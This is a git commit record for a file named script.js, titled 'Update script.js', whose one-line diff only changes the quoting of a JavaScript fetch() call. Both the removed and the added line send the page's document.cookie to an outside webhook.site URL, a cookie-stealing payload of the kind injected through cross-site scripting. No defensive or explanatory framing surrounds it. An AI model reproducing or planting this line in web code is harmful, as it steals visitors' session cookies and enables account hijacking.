07a88c01a41f3ec6b75cb3dda90365e82e5f0389
Pedro Frigolet <pfri258@gmail.com>
2024-12-06 22:37:57 +0000

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-fetch(`https://webhook.site/1b322d1a-aff2-4b12-bbb9-d4da51d77493/?cookie=`+encodeURIComponent(document.cookie));
+fetch('https://webhook.site/1b322d1a-aff2-4b12-bbb9-d4da51d77493/?cookie='+encodeURIComponent(document.cookie));
